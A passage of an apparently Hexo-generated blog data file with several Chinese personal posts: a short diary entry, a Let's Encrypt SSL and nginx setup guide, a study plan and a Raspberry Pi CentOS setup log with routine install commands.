21:26:53\ntags:\n---\n\n今天上午去吃顺口溜，碰巧部门一位女程序媛也去吃。\n\n为什么要这么猥琐的做个记录呢，因为我好几年都没和女生单独坐一起了，更别提交谈了。虽然只是普通同事，但心里感觉非常nice。\n\n&nbsp;\n\n所以有时觉得自己过的挺悲催的，可能就要一辈子打光棍了。","slug":"e5-92-8c-e5-a5-b3-e5-90-8c-e4-ba-8b-e5-90-83-e9-a5-ad","published":1,"updated":"2018-03-05T11:32:58.735Z","comments":1,"layout":"post","photos":[],"link":"","_id":"cjee5cimh00h6gmlm08ntn4i4","content":"<p>今天上午去吃顺口溜，碰巧部门一位女程序媛也去吃。</p>\n<p>为什么要这么猥琐的做个记录呢，因为我好几年都没和女生单独坐一起了，更别提交谈了。虽然只是普通同事，但心里感觉非常nice。</p>\n<p>&nbsp;</p>\n<p>所以有时觉得自己过的挺悲催的，可能就要一辈子打光棍了。</p>\n","site":{"data":{}},"excerpt":"","more":"<p>今天上午去吃顺口溜，碰巧部门一位女程序媛也去吃。</p>\n<p>为什么要这么猥琐的做个记录呢，因为我好几年都没和女生单独坐一起了，更别提交谈了。虽然只是普通同事，但心里感觉非常nice。</p>\n<p>&nbsp;</p>\n<p>所以有时觉得自己过的挺悲催的，可能就要一辈子打光棍了。</p>\n"},{"title":"折腾Let‘s Encrypt免费SSL证书","id":"223","date":"2015-12-04T15:28:27.000Z","_content":"\n今天开始折腾Let’s Encrypt的免费SSL证书。\n\n> [https://letsencrypt.org/howitworks/](https://letsencrypt.org/howitworks/)\n\n通过一行命令，它会自动完成SSL的域名认证，证书生成等工作，最重要的是免费。虽然WoSign,StartSSL也免费，不过申请有点不方便。\n\n首先，在网站DNS指向的机器上，执行创建证书的命令。比如`xiaoai.me`指向`104.155.200.103`，那么只有在`104.155.200.103`上才能调用命令创建。\n\n    $ git clone https://github.com/letsencrypt/letsencrypt\n    $ ./letsencrypt/letsencrypt-auto certonly -d xiaoai.me\n    `</pre>\n\n    任何厂商都需要确保证书不会被冒领，因此Let‘s Encrypt会首先验证你是网站域名拥有者。在执行以上命令时，他们的远程服务器会请求申请的网站，通过预先放置的特殊文件等手段来确认身份。\n\n    但是这一步遇到了DNSpod在海外（Let‘s Encrypt的服务器）解析超时的问题。要解决这个问题，只能放弃DNSpod，没有其它办法。\n\n    > Failed authorization procedure. xiaoai.me (tls-sni-01): urn:acme:error:connection :: The server could not connect to the client for DV :: DNS query timed out\n\n    > 许多人反映DNSpod有问题：https://github.com/letsencrypt/letsencrypt/issues/1610\n\n    我把域名服务器换到google cloud DNS，解决了DNS的问题。\n\n    再次运行，填写联系邮箱，同意协议，接下来就成功了。注意在运行命令前需要先关闭占用`80`端口的服务器。\n\n    > IMPORTANT NOTES:\n>        - Congratulations! Your certificate and chain have been saved at /etc/letsencrypt/live/xiaoai.me/fullchain.pem. Your cert will expire on 2016-03-03\\. To obtain a new version of the certificate in the future, simply run Let's Encrypt again.\n>        - If like Let's Encrypt, please consider supporting our work by:\n>          Donating to ISRG / Let's Encrypt:   https://letsencrypt.org/donate\n>          Donating to EFF:                    https://eff.org/donate-le\n\n    脚本已经自动生成了一套SSL证书，其位置如下：\n\n    <pre>`$ sudo ls /etc/letsencrypt/live/xiaoai.me\n    cert.pem  chain.pem  fullchain.pem  privkey.pem\n    `</pre>\n\n    ### 配置\n\n    接下来把证书添加到nginx的配置文件中就OK了：\n\n    <pre>`ssl on;\n    listen  443 ssl http2;\n    server_name xiaoai.me\n    ssl_certificate /etc/letsencrypt/live/xiaoai.me/fullchain.pem;\n    ssl_certificate_key /etc/letsencrypt/live/xiaoai.me/privkey.pem;\n    `</pre>\n\n    整个过程非常简单，现在网站的证书颁发机构变成了 `Let's Encrypt Authority X1`\n\n    ### 说明\n\n    #### let's encrypt 提供了多种验证方式：\n\n*   上面关闭80端口的服务，由创建脚本暂时监听`xiaoai.me:80`端口，以验证网站属于创建者\n*   通过 `--webroot` 参数指定网站根目录，创建脚本会在目录里放置验证文件，用以让远程服务器来访问\n*   通过 `--apache` 参数，自动干预apache服务器，验证原理和上面类似\n*   不需要也不支持验证网站主的邮箱\n\n    ### 进阶\n\n    #### 多域名\n\n    可以对多个域名生成单个证书，添加多个`-d`参数即可：\n\n    <pre>`./letsencrypt-auto certonly -d xiaoai.me -d www.xiaoai.me -d joaner.com\n    `</pre>\n\n    但是不支持通配符的域名 `*.xiaoai.me`\n\n    > Wildcard domains are not supported\n\n    #### 有效期\n\n    Let’s Encrypt的证书有效期只有**90天**，不过可以设置一个crontab任务自动续期证书\n\n    <pre>`/path/to/letsencrypt-auto certonly -d xiaoai.me --renew --agree-dev-preview\n    nginx -s reload\n    ","source":"_posts/e6-8a-98-e8-85-belets-encrypt-e5-85-8d-e8-b4-b9ssl-e8-af-81-e4-b9-a6.md","raw":"---\ntitle: 折腾Let‘s Encrypt免费SSL证书\nid: 223\ncategories:\n  - linux\ndate: 2015-12-04 23:28:27\ntags:\n---\n\n今天开始折腾Let’s Encrypt的免费SSL证书。\n\n> [https://letsencrypt.org/howitworks/](https://letsencrypt.org/howitworks/)\n\n通过一行命令，它会自动完成SSL的域名认证，证书生成等工作，最重要的是免费。虽然WoSign,StartSSL也免费，不过申请有点不方便。\n\n首先，在网站DNS指向的机器上，执行创建证书的命令。比如`xiaoai.me`指向`104.155.200.103`，那么只有在`104.155.200.103`上才能调用命令创建。\n\n    $ git clone https://github.com/letsencrypt/letsencrypt\n    $ ./letsencrypt/letsencrypt-auto certonly -d xiaoai.me\n    `</pre>\n\n    任何厂商都需要确保证书不会被冒领，因此Let‘s Encrypt会首先验证你是网站域名拥有者。在执行以上命令时，他们的远程服务器会请求申请的网站，通过预先放置的特殊文件等手段来确认身份。\n\n    但是这一步遇到了DNSpod在海外（Let‘s Encrypt的服务器）解析超时的问题。要解决这个问题，只能放弃DNSpod，没有其它办法。\n\n    > Failed authorization procedure. xiaoai.me (tls-sni-01): urn:acme:error:connection :: The server could not connect to the client for DV :: DNS query timed out\n\n    > 许多人反映DNSpod有问题：https://github.com/letsencrypt/letsencrypt/issues/1610\n\n    我把域名服务器换到google cloud DNS，解决了DNS的问题。\n\n    再次运行，填写联系邮箱，同意协议，接下来就成功了。注意在运行命令前需要先关闭占用`80`端口的服务器。\n\n    > IMPORTANT NOTES:\n>        - Congratulations! Your certificate and chain have been saved at /etc/letsencrypt/live/xiaoai.me/fullchain.pem. Your cert will expire on 2016-03-03\\. To obtain a new version of the certificate in the future, simply run Let's Encrypt again.\n>        - If like Let's Encrypt, please consider supporting our work by:\n>          Donating to ISRG / Let's Encrypt:   https://letsencrypt.org/donate\n>          Donating to EFF:                    https://eff.org/donate-le\n\n    脚本已经自动生成了一套SSL证书，其位置如下：\n\n    <pre>`$ sudo ls /etc/letsencrypt/live/xiaoai.me\n    cert.pem  chain.pem  fullchain.pem  privkey.pem\n    `</pre>\n\n    ### 配置\n\n    接下来把证书添加到nginx的配置文件中就OK了：\n\n    <pre>`ssl on;\n    listen  443 ssl http2;\n    server_name xiaoai.me\n    ssl_certificate /etc/letsencrypt/live/xiaoai.me/fullchain.pem;\n    ssl_certificate_key /etc/letsencrypt/live/xiaoai.me/privkey.pem;\n    `</pre>\n\n    整个过程非常简单，现在网站的证书颁发机构变成了 `Let's Encrypt Authority X1`\n\n    ### 说明\n\n    #### let's encrypt 提供了多种验证方式：\n\n*   上面关闭80端口的服务，由创建脚本暂时监听`xiaoai.me:80`端口，以验证网站属于创建者\n*   通过 `--webroot` 参数指定网站根目录，创建脚本会在目录里放置验证文件，用以让远程服务器来访问\n*   通过 `--apache` 参数，自动干预apache服务器，验证原理和上面类似\n*   不需要也不支持验证网站主的邮箱\n\n    ### 进阶\n\n    #### 多域名\n\n    可以对多个域名生成单个证书，添加多个`-d`参数即可：\n\n    <pre>`./letsencrypt-auto certonly -d xiaoai.me -d www.xiaoai.me -d joaner.com\n    `</pre>\n\n    但是不支持通配符的域名 `*.xiaoai.me`\n\n    > Wildcard domains are not supported\n\n    #### 有效期\n\n    Let’s Encrypt的证书有效期只有**90天**，不过可以设置一个crontab任务自动续期证书\n\n    <pre>`/path/to/letsencrypt-auto certonly -d xiaoai.me --renew --agree-dev-preview\n    nginx -s reload\n    ","slug":"e6-8a-98-e8-85-belets-encrypt-e5-85-8d-e8-b4-b9ssl-e8-af-81-e4-b9-a6","published":1,"updated":"2018-03-05T11:32:58.735Z","comments":1,"layout":"post","photos":[],"link":"","_id":"cjee5cimi00h8gmlm3cl3daiv","content":"<p>今天开始折腾Let’s Encrypt的免费SSL证书。</p>\n<blockquote>\n<p><a href=\"https://letsencrypt.org/howitworks/\" target=\"_blank\" rel=\"noopener\">https://letsencrypt.org/howitworks/</a></p>\n</blockquote>\n<p>通过一行命令，它会自动完成SSL的域名认证，证书生成等工作，最重要的是免费。虽然WoSign,StartSSL也免费，不过申请有点不方便。</p>\n<p>首先，在网站DNS指向的机器上，执行创建证书的命令。比如<code>xiaoai.me</code>指向<code>104.155.200.103</code>，那么只有在<code>104.155.200.103</code>上才能调用命令创建。</p>\n<pre><code>$ git clone https://github.com/letsencrypt/letsencrypt\n$ ./letsencrypt/letsencrypt-auto certonly -d xiaoai.me\n`&lt;/pre&gt;\n\n任何厂商都需要确保证书不会被冒领，因此Let‘s Encrypt会首先验证你是网站域名拥有者。在执行以上命令时，他们的远程服务器会请求申请的网站，通过预先放置的特殊文件等手段来确认身份。\n\n但是这一步遇到了DNSpod在海外（Let‘s Encrypt的服务器）解析超时的问题。要解决这个问题，只能放弃DNSpod，没有其它办法。\n\n&gt; Failed authorization procedure. xiaoai.me (tls-sni-01): urn:acme:error:connection :: The server could not connect to the client for DV :: DNS query timed out\n\n&gt; 许多人反映DNSpod有问题：https://github.com/letsencrypt/letsencrypt/issues/1610\n\n我把域名服务器换到google cloud DNS，解决了DNS的问题。\n\n再次运行，填写联系邮箱，同意协议，接下来就成功了。注意在运行命令前需要先关闭占用`80`端口的服务器。\n\n&gt; IMPORTANT NOTES:\n</code></pre><blockquote>\n<pre><code>- Congratulations! Your certificate and chain have been saved at /etc/letsencrypt/live/xiaoai.me/fullchain.pem. Your cert will expire on 2016-03-03\\. To obtain a new version of the certificate in the future, simply run Let&apos;s Encrypt again.\n- If like Let&apos;s Encrypt, please consider supporting our work by:\n  Donating to ISRG / Let&apos;s Encrypt:   https://letsencrypt.org/donate\n  Donating to EFF:                    https://eff.org/donate-le\n</code></pre></blockquote>\n<pre><code>脚本已经自动生成了一套SSL证书，其位置如下：\n\n&lt;pre&gt;`$ sudo ls /etc/letsencrypt/live/xiaoai.me\ncert.pem  chain.pem  fullchain.pem  privkey.pem\n`&lt;/pre&gt;\n\n### 配置\n\n接下来把证书添加到nginx的配置文件中就OK了：\n\n&lt;pre&gt;`ssl on;\nlisten  443 ssl http2;\nserver_name xiaoai.me\nssl_certificate /etc/letsencrypt/live/xiaoai.me/fullchain.pem;\nssl_certificate_key /etc/letsencrypt/live/xiaoai.me/privkey.pem;\n`&lt;/pre&gt;\n\n整个过程非常简单，现在网站的证书颁发机构变成了 `Let&apos;s Encrypt Authority X1`\n\n### 说明\n\n#### let&apos;s encrypt 提供了多种验证方式：\n</code></pre><ul>\n<li>上面关闭80端口的服务，由创建脚本暂时监听<code>xiaoai.me:80</code>端口，以验证网站属于创建者</li>\n<li>通过 <code>--webroot</code> 参数指定网站根目录，创建脚本会在目录里放置验证文件，用以让远程服务器来访问</li>\n<li>通过 <code>--apache</code> 参数，自动干预apache服务器，验证原理和上面类似</li>\n<li><p>不需要也不支持验证网站主的邮箱</p>\n<h3 id=\"进阶\"><a href=\"#进阶\" class=\"headerlink\" title=\"进阶\"></a>进阶</h3><h4 id=\"多域名\"><a href=\"#多域名\" class=\"headerlink\" title=\"多域名\"></a>多域名</h4><p>可以对多个域名生成单个证书，添加多个<code>-d</code>参数即可：</p>\n<pre>`./letsencrypt-auto certonly -d xiaoai.me -d www.xiaoai.me -d joaner.com\n`</pre>\n\n<p>但是不支持通配符的域名 <code>*.xiaoai.me</code></p>\n<blockquote>\n<p>Wildcard domains are not supported</p>\n</blockquote>\n<h4 id=\"有效期\"><a href=\"#有效期\" class=\"headerlink\" title=\"有效期\"></a>有效期</h4><p>Let’s Encrypt的证书有效期只有<strong>90天</strong>，不过可以设置一个crontab任务自动续期证书</p>\n<p><pre>`/path/to/letsencrypt-auto certonly -d xiaoai.me –renew –agree-dev-preview<br>nginx -s reload</pre></p>\n</li>\n</ul>\n","site":{"data":{}},"excerpt":"","more":"<p>今天开始折腾Let’s Encrypt的免费SSL证书。</p>\n<blockquote>\n<p><a href=\"https://letsencrypt.org/howitworks/\" target=\"_blank\" rel=\"noopener\">https://letsencrypt.org/howitworks/</a></p>\n</blockquote>\n<p>通过一行命令，它会自动完成SSL的域名认证，证书生成等工作，最重要的是免费。虽然WoSign,StartSSL也免费，不过申请有点不方便。</p>\n<p>首先，在网站DNS指向的机器上，执行创建证书的命令。比如<code>xiaoai.me</code>指向<code>104.155.200.103</code>，那么只有在<code>104.155.200.103</code>上才能调用命令创建。</p>\n<pre><code>$ git clone https://github.com/letsencrypt/letsencrypt\n$ ./letsencrypt/letsencrypt-auto certonly -d xiaoai.me\n`&lt;/pre&gt;\n\n任何厂商都需要确保证书不会被冒领，因此Let‘s Encrypt会首先验证你是网站域名拥有者。在执行以上命令时，他们的远程服务器会请求申请的网站，通过预先放置的特殊文件等手段来确认身份。\n\n但是这一步遇到了DNSpod在海外（Let‘s Encrypt的服务器）解析超时的问题。要解决这个问题，只能放弃DNSpod，没有其它办法。\n\n&gt; Failed authorization procedure. xiaoai.me (tls-sni-01): urn:acme:error:connection :: The server could not connect to the client for DV :: DNS query timed out\n\n&gt; 许多人反映DNSpod有问题：https://github.com/letsencrypt/letsencrypt/issues/1610\n\n我把域名服务器换到google cloud DNS，解决了DNS的问题。\n\n再次运行，填写联系邮箱，同意协议，接下来就成功了。注意在运行命令前需要先关闭占用`80`端口的服务器。\n\n&gt; IMPORTANT NOTES:\n</code></pre><blockquote>\n<pre><code>- Congratulations! Your certificate and chain have been saved at /etc/letsencrypt/live/xiaoai.me/fullchain.pem. Your cert will expire on 2016-03-03\\. To obtain a new version of the certificate in the future, simply run Let&apos;s Encrypt again.\n- If like Let&apos;s Encrypt, please consider supporting our work by:\n  Donating to ISRG / Let&apos;s Encrypt:   https://letsencrypt.org/donate\n  Donating to EFF:                    https://eff.org/donate-le\n</code></pre></blockquote>\n<pre><code>脚本已经自动生成了一套SSL证书，其位置如下：\n\n&lt;pre&gt;`$ sudo ls /etc/letsencrypt/live/xiaoai.me\ncert.pem  chain.pem  fullchain.pem  privkey.pem\n`&lt;/pre&gt;\n\n### 配置\n\n接下来把证书添加到nginx的配置文件中就OK了：\n\n&lt;pre&gt;`ssl on;\nlisten  443 ssl http2;\nserver_name xiaoai.me\nssl_certificate /etc/letsencrypt/live/xiaoai.me/fullchain.pem;\nssl_certificate_key /etc/letsencrypt/live/xiaoai.me/privkey.pem;\n`&lt;/pre&gt;\n\n整个过程非常简单，现在网站的证书颁发机构变成了 `Let&apos;s Encrypt Authority X1`\n\n### 说明\n\n#### let&apos;s encrypt 提供了多种验证方式：\n</code></pre><ul>\n<li>上面关闭80端口的服务，由创建脚本暂时监听<code>xiaoai.me:80</code>端口，以验证网站属于创建者</li>\n<li>通过 <code>--webroot</code> 参数指定网站根目录，创建脚本会在目录里放置验证文件，用以让远程服务器来访问</li>\n<li>通过 <code>--apache</code> 参数，自动干预apache服务器，验证原理和上面类似</li>\n<li><p>不需要也不支持验证网站主的邮箱</p>\n<h3 id=\"进阶\"><a href=\"#进阶\" class=\"headerlink\" title=\"进阶\"></a>进阶</h3><h4 id=\"多域名\"><a href=\"#多域名\" class=\"headerlink\" title=\"多域名\"></a>多域名</h4><p>可以对多个域名生成单个证书，添加多个<code>-d</code>参数即可：</p>\n<pre>`./letsencrypt-auto certonly -d xiaoai.me -d www.xiaoai.me -d joaner.com\n`</pre>\n\n<p>但是不支持通配符的域名 <code>*.xiaoai.me</code></p>\n<blockquote>\n<p>Wildcard domains are not supported</p>\n</blockquote>\n<h4 id=\"有效期\"><a href=\"#有效期\" class=\"headerlink\" title=\"有效期\"></a>有效期</h4><p>Let’s Encrypt的证书有效期只有<strong>90天</strong>，不过可以设置一个crontab任务自动续期证书</p>\n<p><pre>`/path/to/letsencrypt-auto certonly -d xiaoai.me –renew –agree-dev-preview<br>nginx -s reload</pre></p>\n</li>\n</ul>\n"},{"title":"学习计划","id":"247","date":"2015-12-10T18:43:07.000Z","_content":"\n睡不着，整理一下要学习的技术\n\n### docker\n\n要能做到在多台机器上部署LNMP环境和博客程序\n\n学习文档：\n- https://www.docker.com/\n- www.docker.org.cn/book/\n\n### react\n\n至少实现一个无限下拉列表\n\n*   https://facebook.github.io/react/\n*   http://reactjs.cn/\n\n### polymer\n\n用它写一个wordpress的主题\n\n*   https://www.polymer-project.org/1.0/\n*   http://docs.polymerchina.org/1.0/\n\n### nodejs\n\n写点API或是什么的？比如调用现成的库生成二维码\n\n*   http://expressjs.com/zh/\n\n### Android开发\n\n之前做过一个简单浏览器，这回做一个闹钟吧，并且能设计到接口的封装。","source":"_posts/e5-ad-a6-e4-b9-a0-e8-ae-a1-e5-88-92.md","raw":"---\ntitle: 学习计划\nid: 247\ncategories:\n  - linux\ndate: 2015-12-11 02:43:07\ntags:\n---\n\n睡不着，整理一下要学习的技术\n\n### docker\n\n要能做到在多台机器上部署LNMP环境和博客程序\n\n学习文档：\n- https://www.docker.com/\n- www.docker.org.cn/book/\n\n### react\n\n至少实现一个无限下拉列表\n\n*   https://facebook.github.io/react/\n*   http://reactjs.cn/\n\n### polymer\n\n用它写一个wordpress的主题\n\n*   https://www.polymer-project.org/1.0/\n*   http://docs.polymerchina.org/1.0/\n\n### nodejs\n\n写点API或是什么的？比如调用现成的库生成二维码\n\n*   http://expressjs.com/zh/\n\n### Android开发\n\n之前做过一个简单浏览器，这回做一个闹钟吧，并且能设计到接口的封装。","slug":"e5-ad-a6-e4-b9-a0-e8-ae-a1-e5-88-92","published":1,"updated":"2018-03-05T11:32:58.736Z","comments":1,"layout":"post","photos":[],"link":"","_id":"cjee5cimk00hagmlmvzw9fn87","content":"<p>睡不着，整理一下要学习的技术</p>\n<h3 id=\"docker\"><a href=\"#docker\" class=\"headerlink\" title=\"docker\"></a>docker</h3><p>要能做到在多台机器上部署LNMP环境和博客程序</p>\n<p>学习文档：</p>\n<ul>\n<li><a href=\"https://www.docker.com/\" target=\"_blank\" rel=\"noopener\">https://www.docker.com/</a></li>\n<li><a href=\"http://www.docker.org.cn/book/\" target=\"_blank\" rel=\"noopener\">www.docker.org.cn/book/</a></li>\n</ul>\n<h3 id=\"react\"><a href=\"#react\" class=\"headerlink\" title=\"react\"></a>react</h3><p>至少实现一个无限下拉列表</p>\n<ul>\n<li><a href=\"https://facebook.github.io/react/\" target=\"_blank\" rel=\"noopener\">https://facebook.github.io/react/</a></li>\n<li><a href=\"http://reactjs.cn/\" target=\"_blank\" rel=\"noopener\">http://reactjs.cn/</a></li>\n</ul>\n<h3 id=\"polymer\"><a href=\"#polymer\" class=\"headerlink\" title=\"polymer\"></a>polymer</h3><p>用它写一个wordpress的主题</p>\n<ul>\n<li><a href=\"https://www.polymer-project.org/1.0/\" target=\"_blank\" rel=\"noopener\">https://www.polymer-project.org/1.0/</a></li>\n<li><a href=\"http://docs.polymerchina.org/1.0/\" target=\"_blank\" rel=\"noopener\">http://docs.polymerchina.org/1.0/</a></li>\n</ul>\n<h3 id=\"nodejs\"><a href=\"#nodejs\" class=\"headerlink\" title=\"nodejs\"></a>nodejs</h3><p>写点API或是什么的？比如调用现成的库生成二维码</p>\n<ul>\n<li><a href=\"http://expressjs.com/zh/\" target=\"_blank\" rel=\"noopener\">http://expressjs.com/zh/</a></li>\n</ul>\n<h3 id=\"Android开发\"><a href=\"#Android开发\" class=\"headerlink\" title=\"Android开发\"></a>Android开发</h3><p>之前做过一个简单浏览器，这回做一个闹钟吧，并且能设计到接口的封装。</p>\n","site":{"data":{}},"excerpt":"","more":"<p>睡不着，整理一下要学习的技术</p>\n<h3 id=\"docker\"><a href=\"#docker\" class=\"headerlink\" title=\"docker\"></a>docker</h3><p>要能做到在多台机器上部署LNMP环境和博客程序</p>\n<p>学习文档：</p>\n<ul>\n<li><a href=\"https://www.docker.com/\" target=\"_blank\" rel=\"noopener\">https://www.docker.com/</a></li>\n<li><a href=\"http://www.docker.org.cn/book/\" target=\"_blank\" rel=\"noopener\">www.docker.org.cn/book/</a></li>\n</ul>\n<h3 id=\"react\"><a href=\"#react\" class=\"headerlink\" title=\"react\"></a>react</h3><p>至少实现一个无限下拉列表</p>\n<ul>\n<li><a href=\"https://facebook.github.io/react/\" target=\"_blank\" rel=\"noopener\">https://facebook.github.io/react/</a></li>\n<li><a href=\"http://reactjs.cn/\" target=\"_blank\" rel=\"noopener\">http://reactjs.cn/</a></li>\n</ul>\n<h3 id=\"polymer\"><a href=\"#polymer\" class=\"headerlink\" title=\"polymer\"></a>polymer</h3><p>用它写一个wordpress的主题</p>\n<ul>\n<li><a href=\"https://www.polymer-project.org/1.0/\" target=\"_blank\" rel=\"noopener\">https://www.polymer-project.org/1.0/</a></li>\n<li><a href=\"http://docs.polymerchina.org/1.0/\" target=\"_blank\" rel=\"noopener\">http://docs.polymerchina.org/1.0/</a></li>\n</ul>\n<h3 id=\"nodejs\"><a href=\"#nodejs\" class=\"headerlink\" title=\"nodejs\"></a>nodejs</h3><p>写点API或是什么的？比如调用现成的库生成二维码</p>\n<ul>\n<li><a href=\"http://expressjs.com/zh/\" target=\"_blank\" rel=\"noopener\">http://expressjs.com/zh/</a></li>\n</ul>\n<h3 id=\"Android开发\"><a href=\"#Android开发\" class=\"headerlink\" title=\"Android开发\"></a>Android开发</h3><p>之前做过一个简单浏览器，这回做一个闹钟吧，并且能设计到接口的封装。</p>\n"},{"title":"重新折腾树莓派","id":"260","date":"2016-01-06T13:56:28.000Z","_content":"\n前一阵买了个树莓派，可是三分钟热度没玩几天就扔下了。现在由于手头没有linux机器，所以又开始折腾了。\n\n## 记录下我遇到的问题：\n\n### 有线网卡灯不亮\n\n这是电流强度不足的问题，需要确保输出电流是2A，才能带动网卡运行。通常手机充电器只有1.5A的输出，所以只能保证系统基本运转。\n我的充电器是从淘宝买的树莓派专用的。\n\n### 能用centos吗？\n\n现在可以了，centos7有arm树莓派版。下载地址：\n\n> [CentOS-Userland-7-armv7hl-Minimal-1511-RaspberryPi2.img.xz](http://mirror.centos.org/altarch/7/isos/armhfp/CentOS-Userland-7-armv7hl-Minimal-1511-RaspberryPi2.img.xz)\n\n启动盘制作方法有很多参考资料，win10下面我用的Win32DiskImager，和烧录其它img没有区别。\n注意启动树莓派后，不需要显示器界面来设置密码。直接SSH用户名`root`，密码`centos`即可登录，参见：\n\n> [CentOS 7 for ARM 初体验](https://www.anyran.com/2015/12/21818.html)\n\n### 编译遇到的问题\n\n用yum安装`libxml2`时，提示缺少`xz-devel`，但是yum仓库里没有`xz-devel.armv7hl`\n\n    $ sudo yum install libxml2-devel\n    ---&gt; Package libxml2-devel.armv7hl 0:2.9.1-6.el7.2 will be installed\n    --&gt; Processing Dependency: xz-devel for package: libxml2-devel-2.9.1-6.el7.2.armv7hl\n    --&gt; Finished Dependency Resolution\n    Error: Package: libxml2-devel-2.9.1-6.el7.2.armv7hl (updates)\n               Requires: xz-devel\n\n    $ sudo yum install xz-devel\n    No package xz-devel available.\n    `</pre>\n\n    `xz-devel`目前只在官方dev仓库里有：http://armv7.dev.centos.org/repodir/c7-buildroot/xz/\n\n    <pre>`sudo rpm -i \"http://armv7.dev.centos.org/repodir/c7-buildroot/xz/xz-devel-5.1.2-9alpha.el7.armv7hl.rpm\"\n\n所以单独从RPM文件安装`xz-devel`，之后，就能顺利编译PHP的libxml2模块。","source":"_posts/e9-87-8d-e6-96-b0-e6-8a-98-e8-85-be-e6-a0-91-e8-8e-93-e6-b4-be.md","raw":"---\ntitle: 重新折腾树莓派\nid: 260\ncategories:\n  - linux\ndate: 2016-01-06 21:56:28\ntags:\n---\n\n前一阵买了个树莓派，可是三分钟热度没玩几天就扔下了。现在由于手头没有linux机器，所以又开始折腾了。\n\n## 记录下我遇到的问题：\n\n### 有线网卡灯不亮\n\n这是电流强度不足的问题，需要确保输出电流是2A，才能带动网卡运行。通常手机充电器只有1.5A的输出，所以只能保证系统基本运转。\n我的充电器是从淘宝买的树莓派专用的。\n\n### 能用centos吗？\n\n现在可以了，centos7有arm树莓派版。下载地址：\n\n> [CentOS-Userland-7-armv7hl-Minimal-1511-RaspberryPi2.img.xz](http://mirror.centos.org/altarch/7/isos/armhfp/CentOS-Userland-7-armv7hl-Minimal-1511-RaspberryPi2.img.xz)\n\n启动盘制作方法有很多参考资料，win10下面我用的Win32DiskImager，和烧录其它img没有区别。\n注意启动树莓派后，不需要显示器界面来设置密码。直接SSH用户名`root`，密码`centos`即可登录，参见：\n\n> [CentOS 7 for ARM 初体验](https://www.anyran.com/2015/12/21818.html)\n\n### 编译遇到的问题\n\n用yum安装`libxml2`时，提示缺少`xz-devel`，但是yum仓库里没有`xz-devel.armv7hl`\n\n    $ sudo yum install libxml2-devel\n    ---&gt; Package libxml2-devel.armv7hl 0:2.9.1-6.el7.2 will be installed\n    --&gt; Processing Dependency: xz-devel for package: libxml2-devel-2.9.1-6.el7.2.armv7hl\n    --&gt; Finished Dependency Resolution\n    Error: Package: libxml2-devel-2.9.1-6.el7.2.armv7hl (updates)\n               Requires: xz-devel\n\n    $ sudo yum install xz-devel\n    No package xz-devel available.\n    `</pre>\n\n    `xz-devel`目前只在官方dev仓库里有：http://armv7.dev.centos.org/repodir/c7-buildroot/xz/\n\n    <pre>`sudo rpm -i \"http://armv7.dev.centos.org/repodir/c7-buildroot/xz/xz-devel-5.1.2-9alpha.el7.armv7hl.rpm\"\n\n所以单独从RPM文件安装`xz-devel`，之后，就能顺利编译PHP的libxml2模块。","slug":"e9-87-8d-e6-96-b0-e6-8a-98-e8-85-be-e6-a0-91-e8-8e-93-e6-b4-be","published":1,"updated":"2018-03-05T11:32:58.736Z","comments":1,"layout":"post","photos":[],"link":"","_id":"cjee5ciml00hcgmlmpqkpk1cz","content":"<p>前一阵买了个树莓派，可是三分钟热度没玩几天就扔下了。现在由于手头没有linux机器，所以又开始折腾了。</p>\n<h2 id=\"记录下我遇到的问题：\"><a href=\"#记录下我遇到的问题：\" class=\"headerlink\" title=\"记录下我遇到的问题：\"></a>记录下我遇到的问题：</h2><h3 id=\"有线网卡灯不亮\"><a href=\"#有线网卡灯不亮\" class=\"headerlink\" title=\"有线网卡灯不亮\"></a>有线网卡灯不亮</h3><p>这是电流强度不足的问题，需要确保输出电流是2A，才能带动网卡运行。通常手机充电器只有1.5A的输出，所以只能保证系统基本运转。<br>我的充电器是从淘宝买的树莓派专用的。</p>\n<h3 id=\"能用centos吗？\"><a href=\"#能用centos吗？\" class=\"headerlink\" title=\"能用centos吗？\"></a>能用centos吗？</h3><p>现在可以了，centos7有arm树莓派版。下载地址：</p>\n<blockquote>\n<p><a href=\"http://mirror.centos.org/altarch/7/isos/armhfp/CentOS-Userland-7-armv7hl-Minimal-1511-RaspberryPi2.img.xz\" target=\"_blank\" rel=\"noopener\">CentOS-Userland-7-armv7hl-Minimal-1511-RaspberryPi2.img.xz</a></p>\n</blockquote>\n<p>启动盘制作方法有很多参考资料，win10下面我用的Win32DiskImager，和烧录其它img没有区别。<br>注意启动树莓派后，不需要显示器界面来设置密码。直接SSH用户名<code>root</code>，密码<code>centos</code>即可登录，参见：</p>\n<blockquote>\n<p><a href=\"https://www.anyran.com/2015/12/21818.html\" target=\"_blank\" rel=\"noopener\">CentOS 7 for ARM 初体验</a></p>\n</blockquote>\n<h3 id=\"编译遇到的问题\"><a href=\"#编译遇到的问题\" class=\"headerlink\" title=\"编译遇到的问题\"></a>编译遇到的问题</h3><p>用yum安装<code>libxml2</code>时，提示缺少<code>xz-devel</code>，但是yum仓库里没有<code>xz-devel.armv7hl</code></p>\n<pre><code>$ sudo yum install libxml2-devel\n---&amp;gt; Package libxml2-devel.armv7hl 0:2.9.1-6.el7.2 will be installed\n--&amp;gt; Processing Dependency: xz-devel for package: libxml2-devel-2.9.1-6.el7.2.armv7hl\n--&amp;gt; Finished Dependency Resolution\nError: Package: libxml2-devel-2.9.1-6.el7.2.armv7hl (updates)\n           Requires: xz-devel\n\n$ sudo yum install xz-devel\nNo package xz-devel available.\n`&lt;/pre&gt;\n\n`xz-devel`目前只在官方dev仓库里有：http://armv7.dev.centos.org/repodir/c7-buildroot/xz/\n\n&lt;pre&gt;`sudo rpm -i &quot;http://armv7.dev.centos.org/repodir/c7-buildroot/xz/xz-devel-5.1.2-9alpha.el7.armv7hl.rpm&quot;\n</code></pre><p>所以单独从RPM文件安装<code>xz-devel</code>，之后，就能顺利编译PHP的libxml2模块。</p>\n","site":{"data":{}},"excerpt":"","more":"<p>前一阵买了个树莓派，可是三分钟热度没玩几天就扔下了。现在由于手头没有linux机器，所以又开始折腾了。</p>\n<h2 id=\"记录下我遇到的问题：\"><a href=\"#记录下我遇到的问题：\" class=\"headerlink\" title=\"记录下我遇到的问题：\"></a>记录下我遇到的问题：</h2><h3 id=\"有线网卡灯不亮\"><a href=\"#有线网卡灯不亮\" class=\"headerlink\" title=\"有线网卡灯不亮\"></a>有线网卡灯不亮</h3><p>这是电流强度不足的问题，需要确保输出电流是2A，才能带动网卡运行。通常手机充电器只有1.5A的输出，所以只能保证系统基本运转。<br>我的充电器是从淘宝买的树莓派专用的。</p>\n<h3 id=\"能用centos吗？\"><a href=\"#能用centos吗？\" class=\"headerlink\" 